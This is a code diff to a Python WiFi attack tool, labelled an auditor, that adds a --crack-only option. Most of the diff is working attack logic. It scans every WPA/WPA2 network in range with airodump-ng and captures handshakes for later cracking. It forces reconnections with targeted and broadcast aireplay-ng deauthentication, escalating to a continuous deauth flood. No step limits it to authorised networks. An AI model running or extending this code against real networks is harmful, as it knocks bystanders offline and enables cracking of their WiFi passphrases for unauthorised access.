@@ -477,140 +477,143 @@ def run_auditor(args):
             sys.exit(1)
         os.makedirs(TEMP_DIR, exist_ok=True)
         os.makedirs(HANDSHAKES_DIR, exist_ok=True)
-        interface = get_monitor_interface(args)
-        time.sleep(2)
-        if not verify_injection(interface, args.force):
-            log("Cannot continue without injection capability.")
-            return
-        log(f"Phase 1: Scanning ({SCAN_TIMEOUT}s)...")
-        scan_id = int(time.time())
-        scan_prefix = os.path.join(TEMP_DIR, f"scan_{scan_id}")
-        scan_proc = subprocess.Popen(
-            f"airodump-ng -w {scan_prefix} --output-format csv {interface}",
-            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
-            text=True, start_new_session=True
-        )
-        ACTIVE_PROCS.append(scan_proc)
-        time.sleep(SCAN_TIMEOUT)
-        os.killpg(os.getpgid(scan_proc.pid), signal.SIGINT)
-        scan_proc.wait(timeout=5)
-        ACTIVE_PROCS.remove(scan_proc)
-        time.sleep(1.5)
-        csv_path = f"{scan_prefix}-01.csv"
-        if not os.path.exists(csv_path) or os.path.getsize(csv_path) == 0:
-            log("CRITICAL: Scan CSV is empty.")
-            return
-        targets = parse_scan_csv(csv_path, args)
-        if not targets:
-            log("No WPA/WPA2 targets found.")
-            return
-        log(f"Phase 2: Capturing handshakes for {len(targets)} targets...")
-        newly_captured = []
-        for target in targets:
-            bssid = target['bssid']
-            essid = target['essid']
-            if bssid in SESSION_DATA['completed_bssids']:
-                log(f"Skipping {essid} — already completed.")
-                continue
-            clean_essid = "".join([c if c.isalnum() else "_" for c in essid]) or "unknown"
-            expected_save_path = os.path.join(HANDSHAKES_DIR, f"{clean_essid}_{bssid.replace(':', '')}.cap")
-            if os.path.exists(expected_save_path) and has_handshake(expected_save_path):
-                log(f"Skipping {essid} — handshake already archived.")
-                SESSION_DATA['completed_bssids'].append(bssid)
-                newly_captured.append(expected_save_path)
-                save_session()
-                continue
-            log(f"Locking: {essid} ({bssid}) | PWR: {target['power']} | CH: {target['channel']}")
-            current_channel = target['channel']
-            cap_prefix = os.path.join(TEMP_DIR, f"cap_{bssid.replace(':', '')}")
-            dump_cmd = f"airodump-ng -c {current_channel} --bssid {bssid} -w {cap_prefix} --output-format pcap,csv {interface}"
-            dump_proc = subprocess.Popen(
-                dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-                start_new_session=True
+        if args.crack_only:
+            log("Skipping capture phase (--crack-only)")
+        else:
+            interface = get_monitor_interface(args)
+            time.sleep(2)
+            if not verify_injection(interface, args.force):
+                log("Cannot continue without injection capability.")
+                return
+            log(f"Phase 1: Scanning ({SCAN_TIMEOUT}s)...")
+            scan_id = int(time.time())
+            scan_prefix = os.path.join(TEMP_DIR, f"scan_{scan_id}")
+            scan_proc = subprocess.Popen(
+                f"airodump-ng -w {scan_prefix} --output-format csv {interface}",
+                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
+                text=True, start_new_session=True
             )
-            ACTIVE_PROCS.append(dump_proc)
-            start_time = time.time()
-            handshake_found = False
-            last_deauth = 0
-            deauth_rounds = 0
-            last_channel_check = 0
-            while time.time() - start_time < args.timeout:
-                if time.time() - last_channel_check > 10:
-                    csv_files = glob.glob(f"{cap_prefix}-*.csv")
-                    if csv_files:
-                        temp_targets = parse_scan_csv(sorted(csv_files)[-1], args)
-                        for t in temp_targets:
-                            if t['bssid'] == bssid and t['channel'] != current_channel:
-                                log(f"AP channel changed to {t['channel']}. Restarting airodump...")
-                                kill_subprocesses()
-                                current_channel = t['channel']
-                                dump_cmd = f"airodump-ng -c {current_channel} --bssid {bssid} -w {cap_prefix} --output-format pcap,csv {interface}"
-                                dump_proc = subprocess.Popen(
-                                    dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-                                    start_new_session=True
-                                )
-                                ACTIVE_PROCS.append(dump_proc)
-                                break
-                    last_channel_check = time.time()
-                cap_files = glob.glob(f"{cap_prefix}-*.cap")
-                if cap_files:
-                    current_cap = sorted(cap_files)[-1]
-                    if has_handshake(current_cap):
-                        log(f"✅ Handshake captured for {essid}!")
-                        shutil.copy(current_cap, expected_save_path)
-                        newly_captured.append(expected_save_path)
-                        handshake_found = True
-                        SESSION_DATA['completed_bssids'].append(bssid)
-                        save_session()
-                        kill_subprocesses()
-                        break
-                if time.time() - last_deauth > DEAUTH_INTERVAL and deauth_rounds < MAX_DEAUTH_ROUNDS:
-                    csv_files = glob.glob(f"{cap_prefix}-*.csv")
-                    clients = []
-                    if csv_files:
-                        clients = get_active_clients(sorted(csv_files)[-1], bssid)
-                    if clients:
-                        for client in set(clients[:3]):
-                            log(f"Deauthing client: {client}")
+            ACTIVE_PROCS.append(scan_proc)
+            time.sleep(SCAN_TIMEOUT)
+            os.killpg(os.getpgid(scan_proc.pid), signal.SIGINT)
+            scan_proc.wait(timeout=5)
+            ACTIVE_PROCS.remove(scan_proc)
+            time.sleep(1.5)
+            csv_path = f"{scan_prefix}-01.csv"
+            if not os.path.exists(csv_path) or os.path.getsize(csv_path) == 0:
+                log("CRITICAL: Scan CSV is empty.")
+                return
+            targets = parse_scan_csv(csv_path, args)
+            if not targets:
+                log("No WPA/WPA2 targets found.")
+                return
+            log(f"Phase 2: Capturing handshakes for {len(targets)} targets...")
+            newly_captured = []
+            for target in targets:
+                bssid = target['bssid']
+                essid = target['essid']
+                if bssid in SESSION_DATA['completed_bssids']:
+                    log(f"Skipping {essid} — already completed.")
+                    continue
+                clean_essid = "".join([c if c.isalnum() else "_" for c in essid]) or "unknown"
+                expected_save_path = os.path.join(HANDSHAKES_DIR, f"{clean_essid}_{bssid.replace(':', '')}.cap")
+                if os.path.exists(expected_save_path) and has_handshake(expected_save_path):
+                    log(f"Skipping {essid} — handshake already archived.")
+                    SESSION_DATA['completed_bssids'].append(bssid)
+                    newly_captured.append(expected_save_path)
+                    save_session()
+                    continue
+                log(f"Locking: {essid} ({bssid}) | PWR: {target['power']} | CH: {target['channel']}")
+                current_channel = target['channel']
+                cap_prefix = os.path.join(TEMP_DIR, f"cap_{bssid.replace(':', '')}")
+                dump_cmd = f"airodump-ng -c {current_channel} --bssid {bssid} -w {cap_prefix} --output-format pcap,csv {interface}"
+                dump_proc = subprocess.Popen(
+                    dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                    start_new_session=True
+                )
+                ACTIVE_PROCS.append(dump_proc)
+                start_time = time.time()
+                handshake_found = False
+                last_deauth = 0
+                deauth_rounds = 0
+                last_channel_check = 0
+                while time.time() - start_time < args.timeout:
+                    if time.time() - last_channel_check > 10:
+                        csv_files = glob.glob(f"{cap_prefix}-*.csv")
+                        if csv_files:
+                            temp_targets = parse_scan_csv(sorted(csv_files)[-1], args)
+                            for t in temp_targets:
+                                if t['bssid'] == bssid and t['channel'] != current_channel:
+                                    log(f"AP channel changed to {t['channel']}. Restarting airodump...")
+                                    kill_subprocesses()
+                                    current_channel = t['channel']
+                                    dump_cmd = f"airodump-ng -c {current_channel} --bssid {bssid} -w {cap_prefix} --output-format pcap,csv {interface}"
+                                    dump_proc = subprocess.Popen(
+                                        dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                                        start_new_session=True
+                                    )
+                                    ACTIVE_PROCS.append(dump_proc)
+                                    break
+                        last_channel_check = time.time()
+                    cap_files = glob.glob(f"{cap_prefix}-*.cap")
+                    if cap_files:
+                        current_cap = sorted(cap_files)[-1]
+                        if has_handshake(current_cap):
+                            log(f"✅ Handshake captured for {essid}!")
+                            shutil.copy(current_cap, expected_save_path)
+                            newly_captured.append(expected_save_path)
+                            handshake_found = True
+                            SESSION_DATA['completed_bssids'].append(bssid)
+                            save_session()
+                            kill_subprocesses()
+                            break
+                    if time.time() - last_deauth > DEAUTH_INTERVAL and deauth_rounds < MAX_DEAUTH_ROUNDS:
+                        csv_files = glob.glob(f"{cap_prefix}-*.csv")
+                        clients = []
+                        if csv_files:
+                            clients = get_active_clients(sorted(csv_files)[-1], bssid)
+                        if clients:
+                            for client in set(clients[:3]):
+                                log(f"Deauthing client: {client}")
+                                try:
+                                    subprocess.run(
+                                        f"aireplay-ng -0 {DEAUTH_PACKETS} -a {bssid} -c {client} {interface} < /dev/null > /dev/null 2>&1",
+                                        shell=True, timeout=DEAUTH_TIMEOUT, check=False
+                                    )
+                                except subprocess.TimeoutExpired:
+                                    log(f"Deauth timed out for client {client}, skipping.")
+                        else:
+                            log(f"No clients. Broadcast deauth to {essid}...")
                             try:
                                 subprocess.run(
-                                    f"aireplay-ng -0 {DEAUTH_PACKETS} -a {bssid} -c {client} {interface} < /dev/null > /dev/null 2>&1",
+                                    f"aireplay-ng -0 {DEAUTH_PACKETS} -a {bssid} {interface} < /dev/null > /dev/null 2>&1",
                                     shell=True, timeout=DEAUTH_TIMEOUT, check=False
                                 )
                             except subprocess.TimeoutExpired:
-                                log(f"Deauth timed out for client {client}, skipping.")
-                    else:
-                        log(f"No clients. Broadcast deauth to {essid}...")
-                        try:
-                            subprocess.run(
-                                f"aireplay-ng -0 {DEAUTH_PACKETS} -a {bssid} {interface} < /dev/null > /dev/null 2>&1",
-                                shell=True, timeout=DEAUTH_TIMEOUT, check=False
-                            )
-                        except subprocess.TimeoutExpired:
-                            log("Broadcast deauth timed out.")
-                        if deauth_rounds == MAX_DEAUTH_ROUNDS - 1:
-                            log("Escalating: flooding with continuous deauth for 5s...")
-                            flood_proc = subprocess.Popen(
-                                f"aireplay-ng -0 0 -a {bssid} {interface} < /dev/null > /dev/null 2>&1",
-                                shell=True, start_new_session=True
-                            )
-                            ACTIVE_PROCS.append(flood_proc)
-                            time.sleep(5)
-                            if flood_proc.poll() is None:
-                                try:
-                                    os.killpg(os.getpgid(flood_proc.pid), signal.SIGTERM)
-                                except:
-                                    pass
-                            ACTIVE_PROCS.remove(flood_proc)
-                    last_deauth = time.time()
-                    deauth_rounds += 1
-                if deauth_rounds >= MAX_DEAUTH_ROUNDS:
-                    log(f"Max deauth rounds reached for {essid}. Moving on.")
-                    break
-                time.sleep(2)
-            if not handshake_found:
-                log(f"❌ Failed to capture handshake for {essid}.")
-                kill_subprocesses()
+                                log("Broadcast deauth timed out.")
+                            if deauth_rounds == MAX_DEAUTH_ROUNDS - 1:
+                                log("Escalating: flooding with continuous deauth for 5s...")
+                                flood_proc = subprocess.Popen(
+                                    f"aireplay-ng -0 0 -a {bssid} {interface} < /dev/null > /dev/null 2>&1",
+                                    shell=True, start_new_session=True
+                                )
+                                ACTIVE_PROCS.append(flood_proc)
+                                time.sleep(5)
+                                if flood_proc.poll() is None:
+                                    try:
+                                        os.killpg(os.getpgid(flood_proc.pid), signal.SIGTERM)
+                                    except:
+                                        pass
+                                ACTIVE_PROCS.remove(flood_proc)
+                        last_deauth = time.time()
+                        deauth_rounds += 1
+                    if deauth_rounds >= MAX_DEAUTH_ROUNDS:
+                        log(f"Max deauth rounds reached for {essid}. Moving on.")
+                        break
+                    time.sleep(2)
+                if not handshake_found:
+                    log(f"❌ Failed to capture handshake for {essid}.")
+                    kill_subprocesses()
         restore_network()
         if args.skip_crack:
             log("Skipping cracking phase.")
@@ -661,6 +664,7 @@ def parse_args():
     parser.add_argument("-s", "--min-signal", type=int, default=-100)
     parser.add_argument("--timeout", type=int, default=CAPTURE_TIMEOUT_DEFAULT)
     parser.add_argument("--skip-crack", action="store_true")
+    parser.add_argument("--crack-only", action="store_true", help="Skip capture, only crack handshakes")
     parser.add_argument("--hashcat", action="store_true", help="Use Hashcat (experimental, may fallback)")
     parser.add_argument("--force", action="store_true", help="Bypass injection test")
     return parser.parse_args()
